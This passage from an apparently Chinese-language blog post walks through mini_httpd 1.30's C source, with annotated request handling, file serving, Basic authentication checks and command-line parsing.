METHOD_PUT ) ) == <span class="number">0</span> )</span><br><span class="line">		method = METHOD_PUT;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( method_str, get_method_str( METHOD_DELETE ) ) == <span class="number">0</span> )</span><br><span class="line">		method = METHOD_DELETE;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( method_str, get_method_str( METHOD_TRACE ) ) == <span class="number">0</span> )</span><br><span class="line">		method = METHOD_TRACE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">		send_error( <span class="number">501</span>, <span class="string">"Not Implemented"</span>, <span class="string">""</span>, <span class="string">"That method is not implemented."</span> );</span><br><span class="line"></span><br><span class="line">    strdecode( path, path );<span class="comment">// 对path解码，调用了hexit，处理0-9、a-f、A-F</span></span><br><span class="line">    <span class="keyword">if</span> ( path[<span class="number">0</span>] != <span class="string">'/'</span> )</span><br><span class="line">		send_error( <span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="string">""</span>, <span class="string">"Bad filename."</span> );</span><br><span class="line">    file = &amp;(path[<span class="number">1</span>]);<span class="comment">// path+1即file，跳过第一个字符/</span></span><br><span class="line">    de_dotdot( file );<span class="comment">// 处理了// ../ /./等目录遍历的东西</span></span><br><span class="line">    <span class="keyword">if</span> ( file[<span class="number">0</span>] == <span class="string">'\0'</span> )</span><br><span class="line">		file = <span class="string">"./"</span>;</span><br><span class="line">    <span class="keyword">if</span> ( file[<span class="number">0</span>] == <span class="string">'/'</span> ||( file[<span class="number">0</span>] == <span class="string">'.'</span> &amp;&amp; file[<span class="number">1</span>] == <span class="string">'.'</span> &amp;&amp;( file[<span class="number">2</span>] == <span class="string">'\0'</span> || file[<span class="number">2</span>] == <span class="string">'/'</span> ) ) )</span><br><span class="line">		send_error( <span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="string">""</span>, <span class="string">"Illegal filename."</span> );</span><br><span class="line">    <span class="keyword">if</span> ( vhost )</span><br><span class="line">		file = virtual_file( file );<span class="comment">// 得到虚拟文件名，即带有host-ip的</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置写入超时</span></span><br><span class="line">    <span class="comment">/* Set up the timeout for writing. */</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SIGSET</span></span><br><span class="line">    (<span class="keyword">void</span>) sigset( SIGALRM, handle_write_timeout );</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line">    (<span class="keyword">void</span>) signal( SIGALRM, handle_write_timeout );</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SIGSET */</span></span></span><br><span class="line">    (<span class="keyword">void</span>) alarm( WRITE_TIMEOUT );</span><br><span class="line"></span><br><span class="line">    r = stat( file, &amp;sb );<span class="comment">// 通过文件名filename获取文件信息，并保存在结构体stat中</span></span><br><span class="line">    <span class="keyword">if</span> ( r &lt; <span class="number">0</span> )</span><br><span class="line">		r = get_pathinfo();<span class="comment">// 获取路径信息，失败则-1</span></span><br><span class="line">    <span class="keyword">if</span> ( r &lt; <span class="number">0</span> )</span><br><span class="line">		send_error( <span class="number">404</span>, <span class="string">"Not Found"</span>, <span class="string">""</span>, <span class="string">"File not found."</span> );</span><br><span class="line">    file_len = <span class="built_in">strlen</span>( file );</span><br><span class="line">    <span class="comment">// 判断是否为目录，如果不是则 do_file</span></span><br><span class="line">    <span class="keyword">if</span> ( ! S_ISDIR( sb.st_mode ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Not a directory. */</span></span><br><span class="line">		<span class="keyword">while</span> ( file[file_len - <span class="number">1</span>] == <span class="string">'/'</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    	file[file_len - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">	    	--file_len;</span><br><span class="line">	    &#125;</span><br><span class="line">		do_file();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> idx[<span class="number">10000</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 是目录，但是缺了最后的斜杠</span></span><br><span class="line">		<span class="comment">/* The filename is a directory.  Is it missing the trailing slash? */</span></span><br><span class="line">		<span class="keyword">if</span> ( file[file_len - <span class="number">1</span>] != <span class="string">'/'</span> &amp;&amp; pathinfo == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    	<span class="keyword">char</span> location[<span class="number">10000</span>];</span><br><span class="line">	    	<span class="keyword">if</span> ( query[<span class="number">0</span>] != <span class="string">'\0'</span> )</span><br><span class="line">				(<span class="keyword">void</span>) <span class="built_in">snprintf</span>(location, <span class="keyword">sizeof</span>(location), <span class="string">"Location: %s/?%s"</span>, path,query );</span><br><span class="line">	    	<span class="keyword">else</span></span><br><span class="line">				(<span class="keyword">void</span>) <span class="built_in">snprintf</span>(location, <span class="keyword">sizeof</span>(location), <span class="string">"Location: %s/"</span>, path );</span><br><span class="line">	    	send_error( <span class="number">302</span>, <span class="string">"Found"</span>, location, <span class="string">"Directories must end with a slash."</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">// 对index文件做do_file</span></span><br><span class="line">		<span class="comment">/* Check for an index file. */</span></span><br><span class="line">		<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(index_names) / <span class="keyword">sizeof</span>(<span class="keyword">char</span>*); ++i )</span><br><span class="line">	    &#123;</span><br><span class="line">	    	(<span class="keyword">void</span>) <span class="built_in">snprintf</span>( idx, <span class="keyword">sizeof</span>(idx), <span class="string">"%s%s"</span>, file, index_names[i] );</span><br><span class="line">	    	<span class="keyword">if</span> ( stat( idx, &amp;sb ) &gt;= <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				file = idx;</span><br><span class="line">				do_file();</span><br><span class="line">				<span class="keyword">goto</span> got_one;</span><br><span class="line">			&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">// 是目录则do_dir</span></span><br><span class="line">		<span class="comment">/* Nope, no index file, so it's an actual directory request. */</span></span><br><span class="line">		do_dir();</span><br><span class="line"></span><br><span class="line">		got_one: ;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 请求结束前释放ssl</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">    SSL_free( ssl );</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结束请求，执行exit</span></span><br><span class="line">    finish_request( <span class="number">0</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="do-file（handle-request-call"><a href="#do-file（handle-request-call" class="headerlink" title="do_file（handle_request call"></a>do_file（handle_request call</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_file</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10000</span>];<span class="comment">// 请求内容复制到此buf中操作</span></span><br><span class="line">    <span class="keyword">char</span> mime_encodings[<span class="number">500</span>];<span class="comment">// 获取mime时用到</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* mime_type;<span class="comment">// 文件mime类型</span></span><br><span class="line">    <span class="keyword">char</span> fixed_mime_type[<span class="number">500</span>];<span class="comment">// 处理后的mime</span></span><br><span class="line">    <span class="keyword">char</span>* cp;<span class="comment">// 处理字符串时，char point</span></span><br><span class="line">    <span class="keyword">int</span> fd;<span class="comment">// 文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查本目录的认证情况</span></span><br><span class="line">    <span class="comment">/* Check authorization for this directory. */</span></span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">strncpy</span>( buf, file, <span class="keyword">sizeof</span>(buf) );</span><br><span class="line">    cp = <span class="built_in">strrchr</span>( buf, <span class="string">'/'</span> );</span><br><span class="line">    <span class="keyword">if</span> ( cp == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	(<span class="keyword">void</span>) <span class="built_in">strcpy</span>( buf, <span class="string">"."</span> );</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	*cp = <span class="string">'\0'</span>;</span><br><span class="line">    auth_check( buf );<span class="comment">// 认证检查</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查请求的文件名是否为认证文件自身，即.htpasswd</span></span><br><span class="line">    <span class="comment">/* Check if the filename is the AUTH_FILE itself - that's verboten. */</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( file, AUTH_FILE ) == <span class="number">0</span> ||</span><br><span class="line">	 ( <span class="built_in">strcmp</span>( &amp;(file[<span class="built_in">strlen</span>(file) - <span class="keyword">sizeof</span>(AUTH_FILE) + <span class="number">1</span>]), AUTH_FILE ) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">	   file[<span class="built_in">strlen</span>(file) - <span class="keyword">sizeof</span>(AUTH_FILE)] == <span class="string">'/'</span> ) )</span><br><span class="line">	&#123;</span><br><span class="line">		syslog(</span><br><span class="line">		    LOG_NOTICE, <span class="string">"%.80s URL \"%.80s\" tried to retrieve an auth file"</span>,</span><br><span class="line">		    ntoa( &amp;client_addr ), path );</span><br><span class="line">		send_error( <span class="number">403</span>, <span class="string">"Forbidden"</span>, <span class="string">""</span>, <span class="string">"File is protected."</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// referer请求头的检查</span></span><br><span class="line">    <span class="comment">/* Referrer check. */</span></span><br><span class="line">    check_referrer();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若cgi开启，并且请求的是cgi，则</span></span><br><span class="line">    <span class="comment">/* Is it CGI? */</span></span><br><span class="line">    <span class="keyword">if</span> ( cgi_pattern != (<span class="keyword">char</span>*) <span class="number">0</span> &amp;&amp; match( cgi_pattern, file ) )</span><br><span class="line">	&#123;</span><br><span class="line">		do_cgi();<span class="comment">// 执行cgi</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 若未获取到文件信息，则404</span></span><br><span class="line">    <span class="keyword">if</span> ( pathinfo != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		send_error( <span class="number">404</span>, <span class="string">"Not Found"</span>, <span class="string">""</span>, <span class="string">"File not found."</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 只允许get和head请求</span></span><br><span class="line">    <span class="keyword">if</span> ( method != METHOD_GET &amp;&amp; method != METHOD_HEAD )</span><br><span class="line">		send_error( <span class="number">501</span>, <span class="string">"Not Implemented"</span>, <span class="string">""</span>, <span class="string">"That method is not implemented."</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 正常情况则打开，失败则403</span></span><br><span class="line">    fd = open( file, O_RDONLY );</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		syslog(</span><br><span class="line">	    	LOG_INFO, <span class="string">"%.80s File \"%.80s\" is protected"</span>,</span><br><span class="line">	    	ntoa( &amp;client_addr ), path );</span><br><span class="line">		send_error( <span class="number">403</span>, <span class="string">"Forbidden"</span>, <span class="string">""</span>, <span class="string">"File is protected."</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 识别文件的mime</span></span><br><span class="line">    mime_type = figure_mime( file, mime_encodings, <span class="keyword">sizeof</span>(mime_encodings) );</span><br><span class="line">	<span class="comment">// 按照charset对mime处理</span></span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">snprintf</span>(fixed_mime_type, <span class="keyword">sizeof</span>(fixed_mime_type), mime_type, charset );</span><br><span class="line">	<span class="comment">// 304未修改</span></span><br><span class="line">    <span class="keyword">if</span> ( if_modified_since != (<span class="keyword">time_t</span>) <span class="number">-1</span> &amp;&amp; if_modified_since &gt;= sb.st_mtime )</span><br><span class="line">	&#123;</span><br><span class="line">		add_headers(</span><br><span class="line">	    	<span class="number">304</span>, <span class="string">"Not Modified"</span>, <span class="string">""</span>, mime_encodings, fixed_mime_type,</span><br><span class="line">	    	(<span class="keyword">off_t</span>) <span class="number">-1</span>, sb.st_mtime );</span><br><span class="line">		send_response();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 正常情况下200</span></span><br><span class="line">    add_headers(</span><br><span class="line">		<span class="number">200</span>, <span class="string">"Ok"</span>, <span class="string">""</span>, mime_encodings, fixed_mime_type, sb.st_size,</span><br><span class="line">		sb.st_mtime );</span><br><span class="line">    send_response();<span class="comment">// 向客户端发送响应信息</span></span><br><span class="line">    <span class="keyword">if</span> ( method == METHOD_HEAD )</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 忽略0长度的文件</span></span><br><span class="line">    <span class="keyword">if</span> ( sb.st_size &gt; <span class="number">0</span> )	<span class="comment">/* ignore zero-length files */</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SENDFILE</span></span><br><span class="line"></span><br><span class="line">		<span class="meta">#<span class="meta-keyword">ifndef</span> USE_SSL</span></span><br><span class="line">		send_via_sendfile( fd, conn_fd, sb.st_size );</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line">		<span class="keyword">if</span> ( do_ssl )</span><br><span class="line">	    	send_via_write( fd, sb.st_size );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">	    	send_via_sendfile( fd, conn_fd, sb.st_size );</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line"></span><br><span class="line">		<span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* HAVE_SENDFILE */</span></span></span><br><span class="line">   		send_via_write( fd, sb.st_size );</span><br><span class="line"></span><br><span class="line">		<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_SENDFILE */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>) close( fd );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="do-cgi（do-file-call"><a href="#do-cgi（do-file-call" class="headerlink" title="do_cgi（do_file call"></a>do_cgi（do_file call</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="auth-check（do-file-call"><a href="#auth-check（do-file-call" class="headerlink" title="auth_check（do_file call"></a>auth_check（do_file call</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">auth_check</span><span class="params">( <span class="keyword">char</span>* dirname )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> authpath[<span class="number">10000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb2</span>;</span><span class="comment">// 保存文件信息</span></span><br><span class="line">    <span class="keyword">char</span> authinfo[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">char</span>* authpass;</span><br><span class="line">    <span class="keyword">char</span>* colon;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> line[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="keyword">char</span>* cryp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构建认证文件的完整路径</span></span><br><span class="line">    <span class="comment">/* Construct auth filename. */</span></span><br><span class="line">    <span class="keyword">if</span> ( dirname[<span class="built_in">strlen</span>(dirname) - <span class="number">1</span>] == <span class="string">'/'</span> )</span><br><span class="line">		(<span class="keyword">void</span>) <span class="built_in">snprintf</span>( authpath, <span class="keyword">sizeof</span>(authpath), <span class="string">"%s%s"</span>, dirname, AUTH_FILE );</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">		(<span class="keyword">void</span>) <span class="built_in">snprintf</span>( authpath, <span class="keyword">sizeof</span>(authpath), <span class="string">"%s/%s"</span>, dirname, AUTH_FILE );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取认证文件的文件信息，成功0，失败-1</span></span><br><span class="line">    <span class="comment">/* Does this directory have an auth file? */</span></span><br><span class="line">    <span class="keyword">if</span> ( stat( authpath, &amp;sb2 ) &lt; <span class="number">0</span> )</span><br><span class="line">	<span class="comment">/* Nope, let the request go through. */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果没有authorization请求头</span></span><br><span class="line">    <span class="comment">/* Does this request contain authorization info? */</span></span><br><span class="line">    <span class="keyword">if</span> ( authorization == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	<span class="comment">/* Nope, return a 401 Unauthorized. */</span></span><br><span class="line">		send_authenticate( dirname );<span class="comment">// 发送401未认证错误</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果authorization头中未发现Basic</span></span><br><span class="line">    <span class="comment">/* Basic authorization info? */</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>( authorization, <span class="string">"Basic "</span>, <span class="number">6</span> ) != <span class="number">0</span> )</span><br><span class="line">		send_authenticate( dirname );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 解码认证信息（最后补0</span></span><br><span class="line">    <span class="comment">/* Decode it. */</span></span><br><span class="line">    l = b64_decode(&amp;(authorization[<span class="number">6</span>]), (<span class="keyword">unsigned</span> <span class="keyword">char</span>*) authinfo, <span class="keyword">sizeof</span>(authinfo) - <span class="number">1</span> );</span><br><span class="line">    authinfo[l] = <span class="string">'\0'</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 从认证信息中获取pass</span></span><br><span class="line">    <span class="comment">/* Split into user and password. */</span></span><br><span class="line">    authpass = <span class="built_in">strchr</span>( authinfo, <span class="string">':'</span> );</span><br><span class="line">    <span class="keyword">if</span> ( authpass == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		<span class="comment">/* No colon?  Bogus auth info. */</span></span><br><span class="line">		send_authenticate( dirname );</span><br><span class="line">	*authpass++ = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取其他字段</span></span><br><span class="line">    <span class="comment">/* If there are more fields, cut them off. */</span></span><br><span class="line">    colon = <span class="built_in">strchr</span>( authpass, <span class="string">':'</span> );</span><br><span class="line">    <span class="keyword">if</span> ( colon != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">		*colon = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 打开认证文件，失败403</span></span><br><span class="line">    <span class="comment">/* Open the password file. */</span></span><br><span class="line">    fp = fopen( authpath, <span class="string">"r"</span> );</span><br><span class="line">    <span class="keyword">if</span> ( fp == (FILE*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* The file exists but we can't open it?  Disallow access. */</span></span><br><span class="line">		syslog(</span><br><span class="line">	    	LOG_ERR, <span class="string">"%.80s auth file %.80s could not be opened - %m"</span>,</span><br><span class="line">	    	ntoa( &amp;client_addr ), authpath );</span><br><span class="line">		send_error( <span class="number">403</span>, <span class="string">"Forbidden"</span>, <span class="string">""</span>, <span class="string">"File is protected."</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 一行行读取文件</span></span><br><span class="line">    <span class="comment">/* Read it. */</span></span><br><span class="line">    <span class="keyword">while</span> ( fgets( line, <span class="keyword">sizeof</span>(line), fp ) != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Nuke newline. */</span></span><br><span class="line">		l = <span class="built_in">strlen</span>( line );</span><br><span class="line">		<span class="keyword">if</span> ( line[l - <span class="number">1</span>] == <span class="string">'\n'</span> )</span><br><span class="line">	    	line[l - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取加密后的密码</span></span><br><span class="line">		<span class="comment">/* Split into user and encrypted password. */</span></span><br><span class="line">		cryp = <span class="built_in">strchr</span>( line, <span class="string">':'</span> );</span><br><span class="line">		<span class="keyword">if</span> ( cryp == (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">	    	<span class="keyword">continue</span>;</span><br><span class="line">		*cryp++ = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 用户名匹配</span></span><br><span class="line">		<span class="comment">/* Is this the right user? */</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="built_in">strcmp</span>( line, authinfo ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/* Yes. */</span></span><br><span class="line">			(<span class="keyword">void</span>) fclose( fp );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 密码也匹配</span></span><br><span class="line">			<span class="comment">/* So is the password right? */</span></span><br><span class="line">			<span class="keyword">if</span> ( <span class="built_in">strcmp</span>( crypt( authpass, cryp ), cryp ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">/* Ok! */</span></span><br><span class="line">				remoteuser = line;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 密码不匹配</span></span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="comment">/* No. */</span></span><br><span class="line">				send_authenticate( dirname );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Didn't find that user.  Access denied. */</span></span><br><span class="line">    (<span class="keyword">void</span>) fclose( fp );</span><br><span class="line">    send_authenticate( dirname );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span>** argv )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> argn; <span class="comment">// 参数index，作下标</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span>* <span class="title">pwd</span>;</span></span><br><span class="line">    <span class="keyword">uid_t</span> uid = <span class="number">32767</span>;</span><br><span class="line">    <span class="keyword">gid_t</span> gid = <span class="number">32767</span>;</span><br><span class="line">    usockaddr host_addr4;</span><br><span class="line">    usockaddr host_addr6;</span><br><span class="line">    <span class="keyword">int</span> gotv4, gotv6;</span><br><span class="line">    fd_set lfdset;</span><br><span class="line">    <span class="keyword">int</span> maxfd;</span><br><span class="line">    usockaddr usa;</span><br><span class="line">    <span class="keyword">socklen_t</span> sz;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">char</span>* cp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 变量初始化，解析后再赋其它值</span></span><br><span class="line">    <span class="comment">/* Parse args. */</span></span><br><span class="line">    argv0 = argv[<span class="number">0</span>];</span><br><span class="line">    debug = <span class="number">0</span>;</span><br><span class="line">    port = <span class="number">0</span>;</span><br><span class="line">    dir = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    data_dir = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    do_chroot = <span class="number">0</span>;</span><br><span class="line">    vhost = <span class="number">0</span>;</span><br><span class="line">    cgi_pattern = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    url_pattern = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    no_empty_referrers = <span class="number">0</span>;</span><br><span class="line">    local_pattern = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    charset = DEFAULT_CHARSET;</span><br><span class="line">    p3p = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    max_age = <span class="number">-1</span>;</span><br><span class="line">    user = DEFAULT_USER;<span class="comment">// 启动此程序的用户，默认nobody</span></span><br><span class="line">    hostname = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    logfile = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    pidfile = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">    logfp = (FILE*) <span class="number">0</span>;</span><br><span class="line">    do_ssl = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果开启ssl，则设置证书和cipher</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">    certfile = DEFAULT_CERTFILE;</span><br><span class="line">    cipher = (<span class="keyword">char</span>*) <span class="number">0</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析参数</span></span><br><span class="line">    argn = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( argn &lt; argc &amp;&amp; argv[argn][<span class="number">0</span>] == <span class="string">'-'</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 版本信息</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-V"</span> ) == <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">		    (<span class="keyword">void</span>) <span class="built_in">printf</span>( <span class="string">"%s\n"</span>, SERVER_SOFTWARE );<span class="comment">//"mini_httpd/1.30 26Oct2018"</span></span><br><span class="line">		    <span class="built_in">exit</span>( <span class="number">0</span> );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 读取配置</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-C"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    read_config( argv[argn] );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 开启调试</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-D"</span> ) == <span class="number">0</span> )</span><br><span class="line">		    debug = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 若开启ssl，则标志置1，并设置证书和密码</span></span><br><span class="line">		<span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-S"</span> ) == <span class="number">0</span> )</span><br><span class="line">		    do_ssl = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-E"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    certfile = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-Y"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    cipher = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 指定端口</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-p"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    port = (<span class="keyword">unsigned</span> <span class="keyword">short</span>) atoi( argv[argn] );<span class="comment">// 字符串转数字</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定路径</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-d"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    ++argn;</span><br><span class="line">		    dir = argv[argn];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 指定数据路径</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>( argv[argn], <span class="string">"-dd"</span> ) == <span class="number">0</span> &amp;&amp; argn + <span class="number">1</span> &lt; argc )</span><br><span class="line">		&#123;</span><br><span class="line">		    